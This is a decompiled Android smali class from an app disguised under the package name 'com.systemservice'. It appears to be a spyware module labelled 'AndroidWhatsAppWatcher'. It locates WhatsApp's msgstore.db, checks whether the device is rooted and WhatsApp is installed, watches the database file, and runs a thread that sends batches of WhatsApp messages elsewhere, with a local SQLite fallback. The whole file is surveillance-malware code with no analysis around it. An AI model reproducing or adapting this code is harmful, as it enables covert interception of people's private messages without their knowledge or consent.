.class public Lcom/systemservice/a/c/h/i;
.super Lcom/systemservice/a/d/a;
.source ""


# static fields
.field private static final d:[Ljava/lang/String;


# instance fields
.field private e:Lorg/apache/log4j/Logger;

.field private f:Z

.field private g:Ljava/lang/String;

.field private h:Lcom/systemservice/a/g/h;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const/4 v0, 0x0

    new-array v0, v0, [Ljava/lang/String;

    sput-object v0, Lcom/systemservice/a/c/h/i;->d:[Ljava/lang/String;

    return-void
.end method

.method public constructor <init>(Landroid/content/Context;Ljava/lang/String;Lcom/systemservice/common/features/settingHistory/b;Lcom/systemservice/a/h/k;)V
    .locals 2

    invoke-direct {p0}, Lcom/systemservice/a/d/a;-><init>()V

    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/systemservice/a/c/h/i;->f:Z

    iput-object p2, p0, Lcom/systemservice/a/d/a;->c:Ljava/lang/String;

    invoke-virtual {p0, p3}, Lcom/systemservice/a/d/g;->a(Lcom/systemservice/common/features/settingHistory/b;)V

    invoke-virtual {p0, p4}, Lcom/systemservice/a/d/g;->a(Lcom/systemservice/a/h/b;)V

    const-string p2, "AndroidWhatsAppWatcher"

    invoke-static {p2}, Lcom/systemservice/a/e/m;->a(Ljava/lang/String;)Lorg/apache/log4j/Logger;

    move-result-object v0

    iput-object v0, p0, Lcom/systemservice/a/c/h/i;->e:Lorg/apache/log4j/Logger;

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v1, Lcom/systemservice/a/a/i;->a:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, "msgstore.db"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/systemservice/a/c/h/i;->g:Ljava/lang/String;

    :try_start_0
    new-instance v0, Lcom/systemservice/a/g/h;

    sget-object v1, Lcom/systemservice/a/a/i;->a:Ljava/lang/String;

    invoke-direct {v0, v1}, Lcom/systemservice/a/g/h;-><init>(Ljava/lang/String;)V

    iput-object v0, p0, Lcom/systemservice/a/c/h/i;->h:Lcom/systemservice/a/g/h;

    iget-object v0, p0, Lcom/systemservice/a/c/h/i;->h:Lcom/systemservice/a/g/h;

    invoke-virtual {v0, p1}, Lcom/systemservice/a/g/h;->a(Landroid/content/Context;)V

    iget-object p1, p0, Lcom/systemservice/a/c/h/i;->h:Lcom/systemservice/a/g/h;

    iput-object p3, p1, Lcom/systemservice/a/g/h;->c:Lcom/systemservice/common/features/settingHistory/b;

    iget-object p1, p0, Lcom/systemservice/a/c/h/i;->h:Lcom/systemservice/a/g/h;

    iput-object p4, p1, Lcom/systemservice/a/g/h;->b:Lcom/systemservice/a/h/k;

    iget-object p1, p0, Lcom/systemservice/a/c/h/i;->h:Lcom/systemservice/a/g/h;

    iget-object p3, p0, Lcom/systemservice/a/c/h/i;->g:Ljava/lang/String;

    iput-object p3, p1, Lcom/systemservice/a/g/h;->d:Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    new-instance p3, Ljava/lang/StringBuilder;

    invoke-direct {p3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p4

    invoke-virtual {p3, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p4, ""

    invoke-virtual {p3, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p3

    invoke-static {p2, p3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object p2, p0, Lcom/systemservice/a/c/h/i;->e:Lorg/apache/log4j/Logger;

    new-instance p3, Ljava/lang/StringBuilder;

    invoke-direct {p3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p3, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p2, p1}, Lorg/apache/log4j/Category;->error(Ljava/lang/Object;)V

    :goto_0
    return-void
.end method

.method static synthetic a(Lcom/systemservice/a/c/h/i;)Lorg/apache/log4j/Logger;
    .locals 0

    iget-object p0, p0, Lcom/systemservice/a/c/h/i;->e:Lorg/apache/log4j/Logger;

    return-object p0
.end method

.method private a(Landroid/content/Context;Lcom/systemservice/a/h/k;)V
    .locals 9

    const/4 v0, 0x0

    const/4 v1, 0x1

    const/4 v2, 0x0

    invoke-virtual {p2, v2, v0, v0, v1}, Lcom/systemservice/a/h/k;->a(ZLjava/util/Date;Ljava/util/Date;I)Ljava/util/List;

    move-result-object v0

    if-eqz v0, :cond_3

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v2

    if-lez v2, :cond_3

    invoke-virtual {p0}, Lcom/systemservice/a/d/g;->d()Lcom/systemservice/common/features/settingHistory/b;

    move-result-object v2

    check-cast v2, Lcom/systemservice/a/c/h/j;

    invoke-virtual {v2, p1, v0}, Lcom/systemservice/a/c/h/j;->a(Landroid/content/Context;Ljava/util/List;)I

    move-result v3

    const-string v4, "AndroidWhatsAppWatcher"

    if-ne v3, v1, :cond_0

    const-string p1, "SEND WHATSAPP PACKAGE SUCCESSFUL"

    invoke-static {v4, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v1, p0, Lcom/systemservice/a/c/h/i;->e:Lorg/apache/log4j/Logger;

    invoke-virtual {v1, p1}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    invoke-virtual {p2, v0}, Lcom/systemservice/a/h/k;->a(Ljava/util/List;)V

    goto :goto_1

    :cond_0
    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :cond_1
    :goto_0
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v3

    if-eqz v3, :cond_3

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Lcom/systemservice/a/e/g;

    invoke-virtual {v2, p1, v3}, Lcom/systemservice/a/c/h/j;->a(Landroid/content/Context;Lcom/systemservice/a/e/g;)I

    move-result v5

    const-string v6, "SEND 1 WHATSAPP SUCCESSFUL"

    if-ne v5, v1, :cond_2

    iget-object v5, p0, Lcom/systemservice/a/c/h/i;->e:Lorg/apache/log4j/Logger;

    invoke-virtual {v5, v6}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    invoke-static {v4, v6}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-wide v5, v3, Lcom/systemservice/a/e/g;->a:J

    iget v3, v3, Lcom/systemservice/a/e/g;->g:I

    invoke-virtual {p2, v5, v6, v3}, Lcom/systemservice/a/h/k;->a(JI)V

    goto :goto_0

    :cond_2
    invoke-static {p1}, Lcom/systemservice/common/features/settingHistory/b;->c(Landroid/content/Context;)Z

    move-result v5

    if-eqz v5, :cond_1

    iget-wide v7, v3, Lcom/systemservice/a/e/g;->a:J

    iget v3, v3, Lcom/systemservice/a/e/g;->g:I

    invoke-virtual {p2, v7, v8, v3}, Lcom/systemservice/a/h/k;->a(JI)V

    iget-object v3, p0, Lcom/systemservice/a/c/h/i;->e:Lorg/apache/log4j/Logger;

    invoke-virtual {v3, v6}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    const-string v3, "SEND 1 WHATSAPP to SQLITE"

    invoke-static {v4, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_0

    :cond_3
    :goto_1
    return-void
.end method

.method static synthetic a(Lcom/systemservice/a/c/h/i;Landroid/content/Context;Lcom/systemservice/a/h/k;)V
    .locals 0

    invoke-direct {p0, p1, p2}, Lcom/systemservice/a/c/h/i;->a(Landroid/content/Context;Lcom/systemservice/a/h/k;)V

    return-void
.end method

.method static synthetic b(Lcom/systemservice/a/c/h/i;)Ljava/lang/String;
    .locals 0

    iget-object p0, p0, Lcom/systemservice/a/c/h/i;->g:Ljava/lang/String;

    return-object p0
.end method

.method static synthetic c(Lcom/systemservice/a/c/h/i;)Z
    .locals 0

    iget-boolean p0, p0, Lcom/systemservice/a/c/h/i;->f:Z

    return p0
.end method


# virtual methods
.method public a(Lcom/systemservice/a/b/a;)V
    .locals 0

    return-void
.end method

.method public a(Lcom/systemservice/a/d/b;)V
    .locals 6

    const-string v0, "AndroidWhatsAppWatcher"

    const-string v1, ""

    invoke-super {p0, p1}, Lcom/systemservice/a/d/g;->a(Lcom/systemservice/a/d/b;)V

    :try_start_0
    check-cast p1, Lcom/systemservice/a/b/a;

    invoke-virtual {p1}, Lcom/systemservice/a/b/a;->a()Landroid/content/Context;

    move-result-object p1

    const-string v2, "app_prefs_settings"

    const/4 v3, 0x0

    invoke-virtual {p1, v2, v3}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v2

    invoke-virtual {p0}, Lcom/systemservice/a/d/g;->d()Lcom/systemservice/common/features/settingHistory/b;

    move-result-object v4

    invoke-virtual {v4, p1}, Lcom/systemservice/common/features/settingHistory/b;->d(Landroid/content/Context;)V

    invoke-static {p1}, Lcom/systemservice/a/a/l;->b(Landroid/content/Context;)Z

    move-result v4

    if-eqz v4, :cond_0

    return-void

    :cond_0
    const-string v4, "whatsapp_active"

    invoke-interface {v2, v4, v3}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v4

    const-string v5, "is_device_rooted"

    invoke-interface {v2, v5, v3}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v5

    iput-boolean v5, p0, Lcom/systemservice/a/c/h/i;->f:Z

    const-string v5, "is_whatsapp_installed"

    invoke-interface {v2, v5, v3}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v5

    if-eqz v5, :cond_3

    if-eqz v4, :cond_3

    iget-boolean v4, p0, Lcom/systemservice/a/c/h/i;->f:Z

    if-nez v4, :cond_1

    goto :goto_0

    :cond_1
    sget-object v4, Lcom/systemservice/a/a/j;->a:Ljava/lang/String;

    invoke-interface {v2, v4, v3}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v2

    if-eqz v2, :cond_2

    iget-object p1, p0, Lcom/systemservice/a/c/h/i;->e:Lorg/apache/log4j/Logger;

    const-string v2, "The device is removed!"

    invoke-virtual {p1, v2}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    return-void

    :cond_2
    new-instance v2, Ljava/lang/Thread;

    new-instance v3, Lcom/systemservice/a/c/h/h;

    invoke-direct {v3, p0, p1}, Lcom/systemservice/a/c/h/h;-><init>(Lcom/systemservice/a/c/h/i;Landroid/content/Context;)V

    invoke-direct {v2, v3}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v2}, Ljava/lang/Thread;->start()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    :try_start_1
    invoke-static {}, Lcom/systemservice/a/g/e;->e()V

    iget-object p1, p0, Lcom/systemservice/a/c/h/i;->h:Lcom/systemservice/a/g/h;

    invoke-virtual {p1}, Landroid/os/FileObserver;->startWatching()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto/16 :goto_2

    :catch_0
    move-exception p1

    :try_start_2
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v2, p0, Lcom/systemservice/a/c/h/i;->e:Lorg/apache/log4j/Logger;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v2, p1}, Lorg/apache/log4j/Category;->error(Ljava/lang/Object;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    goto :goto_2

    :cond_3
    :goto_0
    :try_start_3
    iget-object p1, p0, Lcom/systemservice/a/c/h/i;->h:Lcom/systemservice/a/g/h;

    invoke-virtual {p1}, Landroid/os/FileObserver;->stopWatching()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    goto :goto_1

    :catch_1
    move-exception p1

    :try_start_4
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v2, p0, Lcom/systemservice/a/c/h/i;->e:Lorg/apache/log4j/Logger;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v2, p1}, Lorg/apache/log4j/Category;->error(Ljava/lang/Object;)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2

    :goto_1
    return-void

    :catch_2
    move-exception p1

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v0, p0, Lcom/systemservice/a/c/h/i;->e:Lorg/apache/log4j/Logger;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0, p1}, Lorg/apache/log4j/Category;->error(Ljava/lang/Object;)V

    :goto_2
    return-void
.end method

.method public e()[Ljava/lang/String;
    .locals 1

    sget-object v0, Lcom/systemservice/a/c/h/i;->d:[Ljava/lang/String;

    return-object v0
.end method
